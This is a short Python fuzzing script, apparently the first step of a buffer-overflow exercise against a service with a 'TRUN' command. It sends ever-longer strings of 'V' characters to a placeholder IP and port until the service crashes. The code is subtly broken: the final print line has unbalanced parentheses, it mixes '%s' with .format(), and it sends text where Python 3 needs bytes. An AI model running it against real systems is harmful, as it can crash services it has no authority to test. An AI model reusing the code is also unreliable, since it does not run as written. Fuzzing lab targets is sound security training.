import sys, socket
from time import sleep


buf = "V" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('IP',PORT))
		s.send(('TRUN /.:/' + buf))
		s.close()
		sleep(1)
		buf = buf + "V" * 100
	except:
		print("Fuzzing crashed at %s bytes".format(len(buf))
		sys.exit()
